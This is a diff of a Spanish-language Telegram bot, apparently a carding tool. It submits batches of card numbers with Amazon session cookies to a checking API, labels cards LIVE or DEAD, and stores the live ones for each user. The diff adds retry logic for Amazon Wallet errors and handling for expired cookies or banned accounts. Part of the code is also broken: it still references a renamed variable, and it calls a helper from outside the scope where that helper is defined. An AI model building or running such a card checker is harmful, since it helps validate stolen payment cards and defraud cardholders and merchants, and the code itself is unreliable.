@@ -357,14 +357,12 @@ function getCommandParam(msg, commandName) {
     return null;
 }
 
-// Función para verificar tarjetas con cookie (versión completa)
-// Función para verificar tarjetas con cookie (versión que guarda lives)
+// Función para verificar tarjetas con cookie (versión que reintenta wallet)
 async function verificarTarjetasConCookie(chatId, telegramId, cookie, tarjetas, mensajePrevio) {
     const total = tarjetas.length;
     let progressMsg = await sendSafeMessage(chatId, `🔍 Verificando 0/${total}...`);
     const resultados = [];
     
-    // Obtener username del usuario (si existe)
     let username = null;
     if (telegramId) {
         const userRes = await pool.query('SELECT username FROM users WHERE telegram_id = $1', [telegramId]);
@@ -373,54 +371,42 @@ async function verificarTarjetasConCookie(chatId, telegramId, cookie, tarjetas, 
 
     for (let i = 0; i < total; i++) {
         const card = tarjetas[i];
-        try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 120000);
-            const resp = await fetch(API_AMAZON_CHECK_URL, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ card, cookies: cookie }), signal: controller.signal
-            });
-            clearTimeout(timeoutId);
-            const data = await resp.json();
-            const isFatalError = data.message && (
-                data.message.toLowerCase().includes('cookie expirada') ||
-                data.message.toLowerCase().includes('inicia sesión') ||
-                data.message.toLowerCase().includes('cuenta baneada') ||
-                data.message.toLowerCase().includes('account banned') ||
-                data.message.toLowerCase().includes('entra a mi cuenta')
-            );
-            
-            // ========== GUARDAR LIVE EN BD ==========
-            if (data.status === 'LIVE' && username) {
-                try {
-                    await fetch(`${INTERNAL_API_URL}/telegram/save-live`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            username: username,
-                            card: card,
-                            result: { status: 'LIVE', message: data.message }
-                        })
-                    });
-                } catch (err) {
-                    console.error('Error guardando live:', err.message);
-                }
-            }
-            // ========================================
-
-            resultados.push({ card, status: data.status, message: data.message });
-            if (isFatalError) {
-                await sendSafeMessage(chatId, `⛔ Error fatal: ${data.message}. No se continuará.`);
-                break;
-            }
-        } catch (err) {
-            resultados.push({ card, status: 'ERROR', message: err.message });
+        const resultado = await verificarTarjetaConReintentos(card, cookie, 2);
+        
+        // Si es error fatal (cookie expirada, cuenta baneada), cancelar todo
+        if (resultado.isBanned) {
+            await sendSafeMessage(chatId, `⛔ Cookie expirada o cuenta baneada en tarjeta ${i+1}. Proceso cancelado.`);
+            await bot.editMessageText(`🛑 Proceso cancelado por cookie expirada`, { chat_id: chatId, message_id: progressMsg.message_id }).catch(() => {});
+            break;
         }
-        const emoji = resultados[i].status === 'LIVE' ? '✅' : (resultados[i].status === 'DEAD' ? '❌' : '⚠️');
+        
+        // Guardar live si es LIVE
+        if (resultado.status === 'LIVE' && username) {
+            try {
+                await fetch(`${INTERNAL_API_URL}/telegram/save-live`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: username,
+                        card: card,
+                        result: { status: 'LIVE', message: resultado.message }
+                    })
+                });
+            } catch (err) {
+                console.error('Error guardando live:', err.message);
+            }
+        }
+        
+        resultados.push({ card, status: resultado.status, message: resultado.message });
+        
+        const emoji = resultado.status === 'LIVE' ? '✅' : (resultado.status === 'DEAD' ? '❌' : '⚠️');
         try {
-            await bot.editMessageText(`🔍 Verificando ${i+1}/${total}\nÚltima: ${card} → ${resultados[i].status} ${emoji}`, { chat_id: chatId, message_id: progressMsg.message_id });
+            await bot.editMessageText(`🔍 Verificando ${i+1}/${total}\nÚltima: ${card} → ${resultado.status} ${emoji}`, { chat_id: chatId, message_id: progressMsg.message_id });
         } catch (e) {}
+        
         await new Promise(r => setTimeout(r, 800));
     }
+    
     const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
     let resumen = `📊 *Resultados finales*\n${separador}\n`;
     for (const r of resultados) {
@@ -430,6 +416,7 @@ async function verificarTarjetasConCookie(chatId, telegramId, cookie, tarjetas, 
     if (resumen.length > 4096) resumen = resumen.substring(0,4000) + '...';
     await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
 }
+
 // Función para obtener información de BIN desde binlist.net
 async function getBinInfo(bin) {
     try {
@@ -839,7 +826,8 @@ async function procesarExtraConCantidad(chatId, telegramId, extra, cantidad) {
             const isBanned = data.message && (
                 data.message.toLowerCase().includes('cookie expirada') ||
                 data.message.toLowerCase().includes('inicia sesión') ||
-                data.message.toLowerCase().includes('cuenta baneada')
+                data.message.toLowerCase().includes('cuenta baneada') ||
+                data.message.toLowerCase().includes('account banned')
             );
             return { status: data.status, isBanned, message: data.message };
         } catch (err) {
@@ -847,14 +835,56 @@ async function procesarExtraConCantidad(chatId, telegramId, extra, cantidad) {
         }
     };
 
+
+    // Verifica una tarjeta con reintentos si el error es de Wallet
+    async function verificarTarjetaConReintentos(card, cookie, maxReintentos = 2) {
+        let intentos = 0;
+        while (intentos <= maxReintentos) {
+            const resultado = await verificarTarjetaConCookie(card, cookie);
+            const msgLower = (resultado.message || '').toLowerCase();
+            const esErrorWallet = msgLower.includes('no se pudo acceder a wallet') ||
+                                msgLower.includes('error al entrar a amazonwallet') ||
+                                msgLower.includes('fallo al obtener wallet') ||
+                                msgLower.includes('no se pudo agregar tarjeta');
+            
+            // Si es LIVE o DEAD, devolver inmediatamente
+            if (resultado.status === 'LIVE' || resultado.status === 'DEAD') {
+                return { ...resultado, intentos };
+            }
+            
+            // Si es error de wallet y no es el último intento, reintentar
+            if (esErrorWallet && intentos < maxReintentos) {
+                console.log(`🔄 Reintentando tarjeta (${intentos+1}/${maxReintentos}) por error de Wallet`);
+                await new Promise(r => setTimeout(r, 2000)); // espera 2s antes de reintentar
+                intentos++;
+                continue;
+            }
+            
+            // Si es otro error (incluyendo cookie expirada), devolver sin reintentar
+            return { ...resultado, intentos };
+        }
+        // Si se acabaron los reintentos
+        return { status: 'ERROR', message: 'Error de Wallet tras reintentos', isBanned: false, intentos };
+    }
+
+
     let stats = { lives: 0, deads: 0, errors: 0, cookiesUsadas: 0 };
     let currentCookie = await generarCookieAsync();
     let nextCookiePromise = generarCookieAsync().catch(err => { console.error(err); return null; });
     stats.cookiesUsadas++;
     let progressMsg = await sendSafeMessage(chatId, `🔄 Verificando 0/${total}... Cookies: 1`);
     for (let i = 0; i < total; i++) {
-        const res = await verificarTarjetaConCookie(todasLasTarjetas[i], currentCookie);
-        if (res.status === 'LIVE') {
+        const card = todasLasTarjetas[i];
+        let resultado = await verificarTarjetaConReintentos(card, currentCookie, 2);
+        
+        // Si es error fatal (cookie expirada), cancelar
+        if (resultado.isBanned) {
+            await sendSafeMessage(chatId, `⛔ Cookie expirada en tarjeta ${i+1}. Proceso cancelado.`);
+            await bot.editMessageText(`🛑 Proceso cancelado por cookie expirada`, { chat_id: chatId, message_id: progressMsg.message_id }).catch(() => {});
+            break;
+        }
+        
+        if (resultado.status === 'LIVE') {
             stats.lives++;
             try {
                 const userRes = await pool.query('SELECT username FROM users WHERE telegram_id = $1', [telegramId]);
@@ -864,14 +894,12 @@ async function procesarExtraConCantidad(chatId, telegramId, extra, cantidad) {
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             username: userRes.rows[0].username,
-                            card: todasLasTarjetas[i],
-                            result: { status: 'LIVE', message: res.message }
+                            card: card,
+                            result: { status: 'LIVE', message: resultado.message }
                         })
                     });
                 }
-            } catch (err) {
-                console.error('Error guardando live:', err.message);
-            }
+            } catch (err) { console.error('Error guardando live:', err.message); }
         }
         else if (res.status === 'DEAD') stats.deads++;
         else stats.errors++;
@@ -1492,7 +1520,12 @@ bot.onText(/^[\/\.](?:amazoncookieinfinita|amzckin|amazoninfinita)(?:\s+(.+))?/i
 
         for (let i = 0; i < tarjetas.length; i++) {
             const card = tarjetas[i];
-            let resultado = await verificarTarjeta(card, currentCookie);
+            let resultado = await verificarTarjetaConReintentos(card, currentCookie, 2);
+            if (resultado.isBanned) {
+                await sendSafeMessage(chatId, `⛔ Cookie expirada en tarjeta ${i+1}. Proceso cancelado.`);
+                await bot.editMessageText(`🛑 Proceso cancelado por cookie expirada`, { chat_id: chatId, message_id: progressMsg.message_id }).catch(() => {});
+                break;
+            }
             let reintentos = 0;
             
             // Si la cookie expiró, generar nueva y reintentar esta misma tarjeta
